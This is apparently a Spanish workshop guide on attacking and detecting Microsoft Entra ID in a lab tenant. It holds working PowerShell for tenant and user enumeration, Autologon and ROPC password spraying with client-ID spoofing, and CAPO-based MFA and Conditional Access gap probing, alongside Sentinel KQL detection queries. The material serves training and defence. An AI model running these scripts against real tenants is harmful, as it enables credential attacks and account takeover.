# Low & Slow: guía práctica para estudiantes

Esta guía organiza el contenido del taller `Low and Slow` como un recorrido práctico. 

- Ejecuta los bloques `powershell` en PowerShell.
- Ejecuta los bloques `kusto` en Microsoft Sentinel o Log Analytics.


## 1. Consultar `getuserrealm.srf`

Define el dominio y el User-Agent que se utilizarán en las primeras consultas:

```powershell
$domain = 'redtenantlabs.com'
$ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ' +
'(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
```

Consulta `getuserrealm.srf` y muestra el tipo de namespace, la marca de federación, la instancia cloud y la URL de autenticación:

```powershell
Invoke-RestMethod -UserAgent $ua `
  -Uri "https://login.microsoftonline.com/getuserrealm.srf?login=probe@$domain" |
Select-Object NameSpaceType, FederationBrandName, CloudInstanceName, AuthURL | fl
```

## 2. Obtener el tenant ID

Consulta el documento OpenID Connect del dominio y revisa el valor de `issuer` junto con la información regional del tenant:

```powershell
Invoke-RestMethod -UserAgent $ua `
  -Uri "https://login.microsoftonline.com/$domain/v2.0/.well-known/openid-configuration" |
Select-Object issuer, tenant_region_scope, tenant_region_sub_scope, cloud_instance_name | fl
```

## 3. Enumerar un usuario con `GetCredentialType`

Crea el body con el UPN y envíalo al endpoint `GetCredentialType`:

```powershell
$body = @{ username   = 'daniel.carter@redtenantlabs.com'
  isOtherIdpSupported = $true 
} | ConvertTo-Json -Compress
 
Invoke-RestMethod -Method Post -UserAgent $ua -Body $body `
  -ContentType 'application/json' `
  -Uri 'https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US'
```

Revisa `IfExistsResult` en la respuesta antes de continuar con una lista de candidatos.

## 4. Generar candidatos con `username-anarchy`

Clona `username-anarchy`, entra al directorio y genera `candidates.txt` usando `workshop-employee-intelligence.txt`:

```powershell
git clone https://github.com/urbanadventurer/username-anarchy
cd username-anarchy
ruby username-anarchy --suffix '@redtenantlabs.com' --input-file workshop-employee-intelligence.txt > candidates.txt
```

Las comillas conservan el valor de `--suffix` y evitan que PowerShell interprete `@redtenantlabs` como splatting.

## 5. Enumerar la lista de candidatos

Define la función `Enum-EntraUsername`. La función acepta un usuario individual o una ruta, consulta `GetCredentialType`, clasifica cada candidato y opcionalmente guarda los resultados.

```powershell
function Enum-EntraUsername {

  param(
    [Parameter(Mandatory)]
    [string]$InputValue,

    [int]$DelayMs = 0,

    [string]$OutputFile
  )

  $Uri = "https://login.microsoftonline.com/common/GetCredentialType"

  $Headers = @{
    "User-Agent"   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"
    "Content-Type" = "application/json"
  }

  if (Test-Path $InputValue) {
    $Users = Get-Content $InputValue | Where-Object { $_.Trim() -ne "" }
  }
  else {
    $Users = @($InputValue)
  }

  $results = [System.Collections.Generic.List[string]]::new()

  foreach ($u in $Users) {

    $body = @{ Username = $u.Trim() } | ConvertTo-Json -Compress

    try {
      $res = Invoke-RestMethod -Uri $Uri -Method Post -Headers $Headers -Body $body -ErrorAction Stop

      if ($res.IfExistsResult -eq 0) {
        $line = "[+] $u : VALID"
        Write-Host $line -ForegroundColor Green
      }
      else {
        $line = "[-] $u : NOT VALID"
        Write-Host $line -ForegroundColor Red
      }
    }
    catch {
      $line = "[!] $u : ERROR - $_"
      Write-Host $line -ForegroundColor Yellow
    }

    $results.Add($line)

    if ($DelayMs -gt 0) { Start-Sleep -Milliseconds $DelayMs }
  }

  if ($OutputFile) {
    $results | Set-Content -Path $OutputFile -Encoding utf8
    Write-Host "`n[*] Results saved to $OutputFile" -ForegroundColor Cyan
  }
}
```

Ejecuta la función contra la lista generada:

```powershell
Enum-EntraUsername -InputValue ./candidates.txt -OutputFile ./validUsers.txt
```

> esta función guarda textos como `[+] usuario : VALID` y también los resultados no válidos. En la sección de password spraying usaremos UPNs limpios, uno por línea. Antes de usar el archivo con Autologon, su contenido debe coincidir con la lista limpia mostrada en la sección 8.

## 6. Enumerar dominios asociados al tenant

El script consulta dos fuentes para buscar dominios relacionados:

```powershell
$tid = '72f988bf-86f1-41af-91ab-2d7cd011db47'   # microsoft.com
 
(Invoke-RestMethod -Uri "https://tenant-api.micahvandeusen.com/search?tenant_id=$tid").domains
 
(Invoke-RestMethod -Uri 'https://azmap.dev/api/tenant?domain=microsoft.com').related_domains
```

## 7. Validar manualmente una contraseña con Autologon

Define el dominio, el usuario, la contraseña y el endpoint Autologon:

```powershell
$dominio = 'redtenantlabs.com'
$upn = 'scott.bennett@redtenantlabs.com'
$pw = 'xxxxxxx'
$ep = "https://autologon.microsoftazuread-sso.com/$dominio/winauth/trust/2005/usernamemixed"
```

Construye el mensaje SOAP:

```powershell
$soap = @"
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
 xmlns:wsa="http://www.w3.org/2005/08/addressing"
 xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust"
 xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
 <s:Header>
  <wsa:Action>http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
  <wsa:To>$ep</wsa:To>
  <wsse:Security><wsse:UsernameToken>
   <wsse:Username>$upn</wsse:Username><wsse:Password>$pw</wsse:Password>
  </wsse:UsernameToken></wsse:Security>
 </s:Header>
 <s:Body><wst:RequestSecurityToken>
  <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
 </wst:RequestSecurityToken></s:Body>
</s:Envelope>
"@
```

Envía el request y revisa el código HTTP, un posible código `AADSTS` y la presencia de `DesktopSsoToken`:

```powershell
$http = [System.Net.Http.HttpClient]::new()
$bytes = [Text.Encoding]::UTF8.GetBytes($soap)
$body = [System.Net.Http.ByteArrayContent]::new($bytes)
$body.Headers.TryAddWithoutValidation('Content-Type', 'application/soap+xml; charset=utf-8') > $null

$r = $http.PostAsync($ep, $body).Result
$xml = $r.Content.ReadAsStringAsync().Result

"HTTP $([int]$r.StatusCode)"
if ($xml -match 'AADSTS\d+') { $Matches[0] }
if ($xml -match 'DesktopSsoToken') { 'password correcto' }
```

## 8. Ejecutar password spraying con Autologon

Solicita la contraseña utilizada en el spraying:

```powershell
# En el prompt va el password del spraying. En el lab: Rtxxxx scott.bennett password
$spraypw = Read-Host 'Spray password' -AsSecureString
```

Revisa la lista producida por la enumeración:

```powershell
cat validUsers.txt
```

El archivo debe de tener los siguientes UPNs:

```text
amanda.perry@redtenantlabs.com
derek.sullivan@redtenantlabs.com
jordan.quinn@redtenantlabs.com
marcus.reed@redtenantlabs.com
nicole.foster@redtenantlabs.com
scott.bennett@redtenantlabs.com
```

Crea un marcador de ejecución dentro del User-Agent:

```powershell
$run = 'LowSlow-' + (Get-Date -Format 'HHmmss')
$ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ' +
"(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 $run"
```

Ejecuta el módulo Autologon contra un máximo de seis usuarios:

```powershell
.\tools\Invoke-AutologonPasswordSpray.ps1 `
  -Domain 'redtenantlabs.com' `
  -UserListPath validusers.txt  `
  -Password $spraypw `
  -MaximumUsers 6 `
  -DelaySeconds 5 `
  -JitterPercent 10 `
  -UserAgent $ua `
  -OutputPath '.\spray.csv'
```

## 9. Revisar el password spraying en los logs

### Ver qué deja un intento

```kusto
AADNonInteractiveUserSignInLogs
| where TimeGenerated > ago(1d)
| where ResultType == "50126"
| project TimeGenerated, ResultType, IPAddress, UserAgent,
AppId, AppDisplayName, ResourceIdentity,
ClientAppUsed, AuthenticationProtocol
| take 1
```

### Encontrar tu propia ejecución

Primero muestra el User-Agent utilizado:

```powershell
$ua
```

Después busca el marcador en los logs:

```kusto
AADNonInteractiveUserSignInLogs
| where TimeGenerated > ago(1d)
| where UserAgent contains "LowSlow-xxx"    // el marcador del User-Agent
| project TimeGenerated, UserPrincipalName, ResultType, IPAddress, UserAgent
| order by TimeGenerated desc
```

### Detectar el spraying de Autologon en Sentinel

La consulta agrupa por IP y ventanas de 15 minutos, y alerta cuando una misma IP alcanza al menos tres cuentas:

```kusto
AADNonInteractiveUserSignInLogs
| where TimeGenerated > ago(1d)
| where ResultType == "50126"
| where isempty(AppId) and isempty(AppDisplayName)          // sin aplicación
| where ResourceIdentity == "00000002-0000-0000-c000-000000000000" // Windows Azure Active Directory / https://graph.windows.net
| where ClientAppUsed == "Unknown"
| summarize Cuentas = dcount(UserPrincipalName),
Filas   = count(),
Quienes = make_set(UserPrincipalName, 10)
by IPAddress, bin(TimeGenerated, 15m)
| where Cuentas >= 3
| order by TimeGenerated desc
```

## 10. Ejecutar password spraying con client-ID spoofing

Define la función que envía el grant `password` al endpoint OAuth:

```powershell
function Invoke-spraying($upn, $pw, $cid, $UserAgent) {
  $body = @{
    grant_type = 'password'
    username   = $upn
    password   = $pw
    client_id  = $cid
    resource   = 'https://management.azure.com/'
  }

 
  try {
    $r = Invoke-RestMethod -Method Post -Body $body -UseBasicParsing -UserAgent $UserAgent `
      -Uri 'https://login.microsoftonline.com/common/oauth2/token'
  }
  catch {
    # En 5.1 el 400 lanza excepcion, pero el JSON queda en ErrorDetails.
    ($_.ErrorDetails.Message | ConvertFrom-Json).error_description -split ' Trace' | Select -First 1
  }
}
```

Configura un client ID aleatorio, las contraseñas y el marcador del User-Agent:

```powershell
$fakeId = [guid]::NewGuid().Guid        # client-ID spoofing
$validPassword = 'Rtlxxxxx'            # el password del nicole.foster
$WrongPassword = 'Verano2026!'                 # el MISMO malo para toda la sala
$run = 'LowSlow-' + (Get-Date -Format 'HHmmss')
$ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ' +
"(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 $run"
```

Ejecuta los tres casos del archivo:

```powershell
Invoke-spraying 'nicole.foster@redtenantlabs.com' $validPassword  $fakeId $ua
Invoke-spraying 'nicole.foster@redtenantlabs.com' $WrongPassword $fakeId $ua
Invoke-spraying 'rachel.martin@redtenantlabs.com' $WrongPassword $fakeId $ua  # usuario que no existe
```

Los tres requests permiten comparar:

1. usuario existente, contraseña válida y client ID aleatorio;
2. mismo usuario, contraseña incorrecta y mismo client ID;
3. usuario inexistente, contraseña incorrecta y mismo client ID.

## 11. Encontrar la actividad de client-ID spoofing

Busca el marcador del User-Agent en `SigninLogs`:

```kusto
SigninLogs
| where TimeGenerated > ago(1d)
| where UserAgent contains "LowSlow-151741"    // el marcador del User-Agent
| project TimeGenerated, UserPrincipalName, ResultType, ResultDescription, AppId, ClientAppUsed, ServicePrincipalId, AuthenticationProtocol, IPAddress, UserAgent
| order by TimeGenerated desc
```

## 12. clonar CAPO

clona del repositorio de `CAPO`:

```powershell
git clone https://github.com/obikuro/CAPO.git
Import-Module .\CAPO\CAPO.psd1
```

## 13. Preparar los usuarios para MFA probing

Carga los tres usuarios y sus contraseñas:

```powershell
# scott viene de la fase 2: ya confirmamos su password
$scott = 'scott.bennett@redtenantlabs.com'
$pwS = 'Rtl!xxxxxx'
 
$amanda = 'amanda.perry@redtenantlabs.com'
$pwA = 'Rtl!xxxxxxx'
 
$marcus = 'marcus.reed@redtenantlabs.com'
$pwM = 'Rtlxxxxx'
```

El archivo define las variables de Scott, Amanda y Marcus. Los dos probes incluidos a continuación utilizan a Scott y Amanda.

## 14. Probar el gap de plataforma de Scott

Mantén fijos el recurso y el client ID, y utiliza `-SweepUserAgents` para variar el User-Agent:

```powershell
Invoke-CAPO -Domain "redtenantlabs.com" `
  -Username $scott -Password $pwS `
  -Resources 'Microsoft Graph' `
  -ClientIDs 'Microsoft Office' `
  -SweepUserAgents `
  -Delay 5 -Jitter 30
```

## 15. Probar el gap de recurso de Amanda

Mantén fijo el client ID y omite `-Resources` para ejecutar el resource sweep:

```powershell
Invoke-CAPO -Domain "redtenantlabs.com" `
  -Username $amanda -Password $pwA `
  -ClientIDs 'Microsoft Office' `
  -Delay 5 -Jitter 30
```

## 16. Encontrar tus propios probes de CAPO

La consulta une los logs interactivos y no interactivos, filtra la IP y conserva únicamente autenticaciones ROPC:

```kusto
union isfuzzy=true
(SigninLogs                      | extend Tabla = "SigninLogs"),
(AADNonInteractiveUserSignInLogs | extend Tabla = "NoInteractiva")
| where TimeGenerated > ago(1h)
| where IPAddress == "190.171.111.28"
| where AuthenticationProtocol =~ "ropc"
| project TimeGenerated, UserPrincipalName, ResultType,
ResourceDisplayName, AppDisplayName,
ClientAppUsed, UserAgent,
AuthenticationRequirement,
ConditionalAccessStatus, SessionId
| order by TimeGenerated asc
```

Al revisar los resultados, compara el usuario, el resultado, el recurso, la aplicación, el tipo de cliente, el User-Agent, el requisito de autenticación y el estado de Conditional Access.


## 17. Detección de ROPC y CAP probing

Una consulta, dos niveles de confianza
El query correlaciona actividad ROPC por usuario e IP, mide la diversidad que genera el sweep y aumenta la confianza cuando encuentra éxitos single-factor junto con interrupciones de MFA o bloqueos de CAP.

```kusto
let Lookback = 1h;
union isfuzzy=true SigninLogs, AADNonInteractiveUserSignInLogs
| where TimeGenerated > ago(Lookback)
| where AuthenticationProtocol =~ "ropc"
| summarize
    Attempts = count(),
    Resources = dcountif(ResourceId, isnotempty(ResourceId)),
    Apps = dcountif(AppId, isnotempty(AppId)),
    UAs = dcountif(UserAgent, isnotempty(UserAgent)),
    SingleFactorSuccess = countif(
        ResultType == "0" and
        AuthenticationRequirement =~ "singleFactorAuthentication"),
    MFAStops = countif(ResultType in ("50076", "50079")),
    Blocks = countif(ResultType == "53003")
    by UserPrincipalName, IPAddress
| extend ProbingPattern =
    Attempts >= 6
    and (Resources >= 4 or Apps >= 4 or UAs >= 4)
    and SingleFactorSuccess > 0
    and (MFAStops > 0 or Blocks > 0)
| extend Signal = case(
    ProbingPattern, "High confidence: CAPO-like probing",
    SingleFactorSuccess > 0, "High sensitivity: successful ROPC",
    "No signal")
| where Signal != "No signal"
| order by ProbingPattern desc, Attempts desc

```
